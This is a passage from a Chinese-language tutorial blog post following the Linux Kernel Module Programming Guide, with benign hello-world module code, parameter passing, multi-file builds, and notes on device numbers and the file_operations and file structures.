class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>修改Makefile，编译加载内核，查看记录信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ 2774.912662] Hello, world 3</span><br></pre></td></tr></table></figure>

<h3 id="2-5-Hello-World-part-4-Licensing-and-Module-Documentation"><a href="#2-5-Hello-World-part-4-Licensing-and-Module-Documentation" class="headerlink" title="2.5 Hello World (part 4): Licensing and Module Documentation"></a>2.5 Hello World (part 4): Licensing and Module Documentation</h3><ul>
<li>Licensing：使用<code>MODULE_LICENSE()</code>宏定义。<code>GPL</code>代表模块开源免费</li>
<li>Description：使用<code>MODULE_DESCRIPTION</code>宏定义。描述模块用于做什么。</li>
<li>Author：使用<code>MODULE_AUTHOR</code>宏定义。描述作者</li>
<li>支持设备：<code>MODULE_SUPPORTED_DEVICE()</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-4.c - Demonstrates module documentation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_AUTHOR <span class="string">&quot;Peter Jay Salzman &lt;p@dirac.org&gt;&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_DESC   <span class="string">&quot;A sample driver&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">init_hello_4</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world 4\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">cleanup_hello_4</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 4\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(init_hello_4);</span><br><span class="line">module_exit(cleanup_hello_4);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  You can use strings, like this:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Get rid of taint message by declaring code as GPL. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Or with defines, like this:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MODULE_AUTHOR(DRIVER_AUTHOR);	<span class="comment">/* Who wrote this module? */</span></span><br><span class="line">MODULE_DESCRIPTION(DRIVER_DESC);	<span class="comment">/* What does this module do */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  This module uses /dev/testdevice.  The MODULE_SUPPORTED_DEVICE macro might</span></span><br><span class="line"><span class="comment"> *  be used in the future to help automatic configuration of modules, but is </span></span><br><span class="line"><span class="comment"> *  currently unused other than for documentation purposes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MODULE_SUPPORTED_DEVICE(<span class="string">&quot;testdevice&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-6-向内核模块传递命令行参数"><a href="#2-6-向内核模块传递命令行参数" class="headerlink" title="2.6 向内核模块传递命令行参数"></a>2.6 向内核模块传递命令行参数</h3><p>需要将要传入参数的变量声明为全局变量，并且使用module_param()宏定义。运行时，insmod会将命令行参数传入。<code>./insmod mymodule.ko myvariable=5**</code></p>
<p>module_param()宏接受3个参数：变量名，类型，对应文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> myint = <span class="number">3</span>;</span><br><span class="line">module_param(myint, <span class="type">int</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>数组变量格式稍有不同：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> myintarray[<span class="number">2</span>];</span><br><span class="line">module_param_array(myintarray, <span class="type">int</span>, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">/* not interested in count */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> myshortarray[<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line">module_parm_array(myshortarray, <span class="type">short</span>, , <span class="number">0</span>); <span class="comment">/* put count into &quot;count&quot; variable */</span></span><br></pre></td></tr></table></figure>

<p><code>MODULE_PARM_DESC()</code>记录模块接受的参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  hello-5.c - Demonstrates command line argument passing to a module.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Peter Jay Salzman&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">short</span> <span class="type">int</span> myshort = <span class="number">1</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> myint = <span class="number">420</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="type">int</span> mylong = <span class="number">9999</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *mystring = <span class="string">&quot;blah&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> myintArray[<span class="number">2</span>] = &#123; <span class="number">-1</span>, <span class="number">-1</span> &#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> arr_argc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * module_param(foo, int, 0000)</span></span><br><span class="line"><span class="comment"> * The first param is the parameters name</span></span><br><span class="line"><span class="comment"> * The second param is it&#x27;s data type</span></span><br><span class="line"><span class="comment"> * The final argument is the permissions bits, </span></span><br><span class="line"><span class="comment"> * for exposing parameters in sysfs (if non-zero) at a later stage.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">module_param(myshort, <span class="type">short</span>, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);</span><br><span class="line">MODULE_PARM_DESC(myshort, <span class="string">&quot;A short integer&quot;</span>);</span><br><span class="line">module_param(myint, <span class="type">int</span>, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);</span><br><span class="line">MODULE_PARM_DESC(myint, <span class="string">&quot;An integer&quot;</span>);</span><br><span class="line">module_param(mylong, <span class="type">long</span>, S_IRUSR);</span><br><span class="line">MODULE_PARM_DESC(mylong, <span class="string">&quot;A long integer&quot;</span>);</span><br><span class="line">module_param(mystring, charp, <span class="number">0000</span>);</span><br><span class="line">MODULE_PARM_DESC(mystring, <span class="string">&quot;A character string&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * module_param_array(name, type, num, perm);</span></span><br><span class="line"><span class="comment"> * The first param is the parameter&#x27;s (in this case the array&#x27;s) name</span></span><br><span class="line"><span class="comment"> * The second param is the data type of the elements of the array</span></span><br><span class="line"><span class="comment"> * The third argument is a pointer to the variable that will store the number </span></span><br><span class="line"><span class="comment"> * of elements of the array initialized by the user at module loading time</span></span><br><span class="line"><span class="comment"> * The fourth argument is the permission bits</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">module_param_array(myintArray, <span class="type">int</span>, &amp;arr_argc, <span class="number">0000</span>);</span><br><span class="line">MODULE_PARM_DESC(myintArray, <span class="string">&quot;An array of integers&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_5_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world 5\n=============\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;myshort is a short integer: %hd\n&quot;</span>, myshort);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;myint is an integer: %d\n&quot;</span>, myint);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;mylong is a long integer: %ld\n&quot;</span>, mylong);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;mystring is a string: %s\n&quot;</span>, mystring);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (<span class="keyword">sizeof</span> myintArray / <span class="keyword">sizeof</span> (<span class="type">int</span>)); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;myintArray[%d] = %d\n&quot;</span>, i, myintArray[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;got %d arguments for myintArray.\n&quot;</span>, arr_argc);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_5_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 5\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_5_init);</span><br><span class="line">module_exit(hello_5_exit);</span><br></pre></td></tr></table></figure>

<p>编译生成的模块<code>hello_5</code>基本信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">modinfo hello-5.ko</span><br><span class="line">filename:       /home/bronya/Documents/LKM/writeup/code/hello-5.ko</span><br><span class="line">author:         Peter Jay Salzman</span><br><span class="line">license:        GPL</span><br><span class="line">srcversion:     A704327C32F7F311666C13C</span><br><span class="line">depends:        </span><br><span class="line">retpoline:      Y</span><br><span class="line">name:           hello_5</span><br><span class="line">vermagic:       6.2.0-37-generic SMP preempt mod_unload modversions </span><br><span class="line">parm:           myshort:A short integer (short)</span><br><span class="line">parm:           myint:An integer (int)</span><br><span class="line">parm:           mylong:A long integer (long)</span><br><span class="line">parm:           mystring:A character string (charp)</span><br><span class="line">parm:           myintArray:An array of integers (array of int)</span><br></pre></td></tr></table></figure>

<p>加载模块显示信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ 4659.140006] hello_5: unknown parameter &#x27;mybyte&#x27; ignored</span><br><span class="line">[ 4659.140047] Hello, world 5</span><br><span class="line">               =============</span><br><span class="line">[ 4659.140048] myshort is a short integer: 1</span><br><span class="line">[ 4659.140049] myint is an integer: 420</span><br><span class="line">[ 4659.140049] mylong is a long integer: 9999</span><br><span class="line">[ 4659.140050] mystring is a string: bebop</span><br><span class="line">[ 4659.140050] myintArray[0] = -1</span><br><span class="line">[ 4659.140051] myintArray[1] = -1</span><br><span class="line">[ 4659.140051] got 1 arguments for myintArray.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-7-多文件编译模块"><a href="#2-7-多文件编译模块" class="headerlink" title="2.7 多文件编译模块"></a>2.7 多文件编译模块</h3><p>可以将内核模块分为多个源文件</p>
<p>例：一个模块分为start，stop，将入口函数和退出函数分离</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  start.c - Illustration of multi filed modules</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world - this is the kernel speaking\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  stop.c - Illustration of multi filed modules</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module  */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Short is the life of a kernel module\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>Makefile</code>：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m += hello-1.o</span><br><span class="line">obj-m += hello-2.o</span><br><span class="line">obj-m += hello-3.o</span><br><span class="line">obj-m += hello-4.o</span><br><span class="line">obj-m += hello-5.o</span><br><span class="line">obj-m += startstop.o</span><br><span class="line">startstop-objs := start.o stop.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(<span class="built_in">shell</span> pwd)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(<span class="built_in">shell</span> pwd)</span> clean</span><br></pre></td></tr></table></figure>

<h3 id="2-8-重新编译内核"><a href="#2-8-重新编译内核" class="headerlink" title="2.8 重新编译内核"></a>2.8 重新编译内核</h3><p>有利于版本的匹配以及内核模块的动态装载以及强制卸载。此处不再详细描述。想了解的读者可以参考原文（<a href="https://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html#AEN380%EF%BC%89">https://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html#AEN380）</a></p>
<h2 id="Chapter-3-初步知识"><a href="#Chapter-3-初步知识" class="headerlink" title="Chapter 3 初步知识"></a>Chapter 3 初步知识</h2><h3 id="3-1-模块与程序"><a href="#3-1-模块与程序" class="headerlink" title="3.1 模块与程序"></a>3.1 模块与程序</h3><h4 id="3-1-1-模块如何开始与结束"><a href="#3-1-1-模块如何开始与结束" class="headerlink" title="3.1.1 模块如何开始与结束"></a>3.1.1 模块如何开始与结束</h4><ul>
<li>程序通常使用main()函数作为入口函数，在执行完所有指令后退出。</li>
<li>内核模块使用module__init指定入口函数。初始化操作向内核提供了模块的函数，当内核需要调用模块函数时才会真正执行模块中代码；模块结束使用module_exit，是init操作的反向操作。</li>
</ul>
<h4 id="3-1-2-模块可以调用的函数"><a href="#3-1-2-模块可以调用的函数" class="headerlink" title="3.1.2  模块可以调用的函数"></a>3.1.2  模块可以调用的函数</h4><p>程序可以调用标准C语言库，例如<code>printf()</code>。</p>
<p>内核模块只能调用内核实现的函数，因为模块的目标文件的符号由insmod解析。符号的定义来自于内核本身，导致能够调用的函数只能是由内核提供的，即系统调用（write，ioctl，read）。内核到处的符号可以参见<code>/proc/kallsyms</code>。</p>
<p>库函数运行在用户空间，向开发者提供了系统调用更方便的接口（库函数仍然需要调用系统调用实现）。系统调用运行在内核态。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123; <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>gcc -Wall -o test test.c</code>编译，<code>strace ./hello</code>可以看到输出最后有<code>write(1, &quot;hello&quot;, 5hello)</code>为printf使用的系统调用。</p>
<p><code>man 2 write</code>：查看write函数的使用说明，2代表系统调用（kill(), read()）；3代表库函数</p>
<p>可以使用模块来替代内核的系统调用，基于此可以实现插入后门或木马等操作。</p>
<h4 id="3-1-3-用户空间与内核空间"><a href="#3-1-3-用户空间与内核空间" class="headerlink" title="3.1.3 用户空间与内核空间"></a>3.1.3 用户空间与内核空间</h4><p>内核态与用户态的转换</p>
<h4 id="3-1-4-命名空间"><a href="#3-1-4-命名空间" class="headerlink" title="3.1.4 命名空间"></a>3.1.4 命名空间</h4><p>开发者自己开发的变量名不能与其他开发者的冲突，因此会有命名空间来避免（C++有<code>std::</code>，C里这里只提到了要多注意，应该是没有）</p>
<p>当写内核模块时，由于内核模块会被加载到整个内核，因此更需要进行命名管理。最好的方式是将所有变量声明为static且使用合适的前缀命名变量。习惯上，Linux内核变量名一般为小写形式。（还可以定义一个符号表，后面会提到）</p>
<h4 id="3-1-5-代码空间"><a href="#3-1-5-代码空间" class="headerlink" title="3.1.5 代码空间"></a>3.1.5 代码空间</h4><p>内存管理是十分复杂的问题。这里只探究写内核模块需要考虑的问题</p>
<p>每开启一个新进程，内核会为其分配一个真实的物理内存，内存在进程看来为虚拟内存，从0x00000000开始，不同进程的内存地址（0xbffff978）对应的实际地址并不相同。每个进程的虚拟内存与实际内存之间存在着特定偏移。且不同进程无法访问其他进程的内存地址。</p>
<p>内核也有自己的代码空间。由于内核模块是加载到内核中使用，其会与内核共享代码空间。因此如果内核模块内存错误，内核也会出现内存错误。</p>
<p>以上为针对宏内核操作系统，微内核操作系统每个模块有独立的代码空间（GNU Hurd， QNX Neutrino）。</p>
<h4 id="3-1-6-Device-Drivers"><a href="#3-1-6-Device-Drivers" class="headerlink" title="3.1.6 Device Drivers"></a>3.1.6 Device Drivers</h4><p>一类模块是设备驱动程序，为硬件提供功能。在unix系统中，每一个硬件都由&#x2F;dev中的文件表示。设备驱动程序可以代表用户程序与硬件进行通信。例如es1370.o声卡驱动程序可以将&#x2F;dev&#x2F;sound连接到Ensoniq IS1370声卡。用户空间的程序可以直接使用&#x2F;dev&#x2F;sound不需要考虑声卡类型。</p>
<h5 id="3-1-6-1-Major-and-Minor-Numbers"><a href="#3-1-6-1-Major-and-Minor-Numbers" class="headerlink" title="3.1.6.1 Major and Minor Numbers"></a>3.1.6.1 Major and Minor Numbers</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ls -l /dev/sda[1-3]</span><br><span class="line">brw-rw---- 1 root disk 8, 1  1月  5 09:11 /dev/sda1</span><br><span class="line">brw-rw---- 1 root disk 8, 2  1月  5 09:11 /dev/sda2</span><br><span class="line">brw-rw---- 1 root disk 8, 3  1月  5 09:11 /dev/sda3</span><br></pre></td></tr></table></figure>

<p>上图表示了硬盘的前三个分区，其中由逗号分隔的数字前面的为Major Number，后面为Minor Number。Major Number表示哪一个设备驱动访问该硬件，每一个设备驱动都有特定的major number。</p>
<p>Minor Number用来分别同一驱动控制的不同设备。</p>
<p>设备分为两类：字符设备和块设备。块设备有一个缓冲区存放请求（可以对请求进行排序）存储设备；字符设备则没有缓冲区。可以通过查看ls -l中第一个字符为’b’还是’c’来分辨。</p>
<p>可以通过查阅<code>/usr/src/linux/Documentation/devices.txt</code>来了解major number对应的设备</p>
<h2 id="Chapter-4-字符设备文件"><a href="#Chapter-4-字符设备文件" class="headerlink" title="Chapter 4 字符设备文件"></a>Chapter 4 字符设备文件</h2><h3 id="4-1-字符设备驱动程序"><a href="#4-1-字符设备驱动程序" class="headerlink" title="4.1 字符设备驱动程序"></a>4.1 字符设备驱动程序</h3><h4 id="4-1-1-file-operations-结构体"><a href="#4-1-1-file-operations-结构体" class="headerlink" title="4.1.1 file_operations 结构体"></a>4.1.1 file_operations 结构体</h4><p>提供了设备驱动程序对设备的多种操作函数的地址，操作函数定义在内核模块中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	 <span class="type">loff_t</span>(*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">	 <span class="type">ssize_t</span>(*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*aio_read) (<span class="keyword">struct</span> kiocb *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span>);</span><br><span class="line">	 <span class="type">ssize_t</span>(*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*aio_write) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>,</span><br><span class="line">			      <span class="type">loff_t</span>);</span><br><span class="line">	<span class="type">int</span> (*readdir) (<span class="keyword">struct</span> file *, <span class="type">void</span> *, <span class="type">filldir_t</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span>;</span><br><span class="line">	<span class="type">int</span> (*ioctl) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>,</span><br><span class="line">		      <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">	<span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">	<span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dentry *, <span class="type">int</span> datasync);</span><br><span class="line">	<span class="type">int</span> (*aio_fsync) (<span class="keyword">struct</span> kiocb *, <span class="type">int</span> datasync);</span><br><span class="line">	<span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*readv) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>,</span><br><span class="line">			  <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*writev) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>,</span><br><span class="line">			   <span class="type">loff_t</span> *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*sendfile) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">read_actor_t</span>,</span><br><span class="line">			     <span class="type">void</span> __user *);</span><br><span class="line">	 <span class="type">ssize_t</span>(*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>,</span><br><span class="line">			     <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>,</span></span><br><span class="line"><span class="params">					    <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>,</span></span><br><span class="line"><span class="params">					    <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>改进</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc extension</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">	read: device_read,</span><br><span class="line">	write: device_write,</span><br><span class="line">	open: device_open,</span><br><span class="line">	release: device_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C99 way</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">	.read = device_read,</span><br><span class="line">	.write = device_write,</span><br><span class="line">	.open = device_open,</span><br><span class="line">	.release = device_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="4-1-2-file结构体"><a href="#4-1-2-file结构体" class="headerlink" title="4.1.2 file结构体"></a>4.1.2 file结构体</h4><p>每个设备在内核中由file结构体表示。该结构是内核水平的结构体，不会再用户空间出现。与glibc定义的FILE结构体不同。另外，其代表的是抽象的打开file，而不是硬盘上的file文件（使用inode结构体表示）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * f_&#123;lock,count,pos_lock&#125; members can be highly contended and share</span></span><br><span class="line"><span class="comment"> * the same cacheline. f_&#123;lock,mode&#125; are very frequently used together</span></span><br><span class="line"><span class="comment"> * and so share the same cacheline as well. The read-mostly</span></span><br><span class="line"><span class="comment"> * f_&#123;path,inode,op&#125; are kept on a separate cacheline.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">f_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">f_rcuhead</span>;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> 		f_iocb_flags;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="type">fmode_t</span>			f_mode;</span><br><span class="line">	<span class="type">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="type">loff_t</span>			f_pos;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		f_flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> 